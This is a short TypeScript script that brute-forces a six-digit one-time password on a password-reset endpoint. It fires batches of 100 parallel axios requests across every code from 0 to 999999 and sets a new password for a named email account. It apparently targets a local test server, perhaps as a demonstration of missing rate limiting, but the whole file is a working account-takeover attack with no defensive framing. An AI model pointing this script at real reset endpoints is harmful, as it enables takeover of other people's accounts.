import axios from "axios";

async function sendReq(otp: string) {
  let data = JSON.stringify({
    email: "ashutosh@gmail.com",
    otp: otp,
    newPassword: 3433234,
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/reset-password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };
 

  try {
    
      await axios.request(config);
  } catch (e) {
    
  }

}
// sendReq("843222");

async function main() {
    for (let i =0 ; i<=999999; i+=100){ 
        const p = [];
        console.log(i)
    for (let j=0; j<100; j++){
        //@ts-ignore
        p.push(sendReq((i+j).toString()))
    }
    await Promise.all(p)
        
    }
    
}
main()

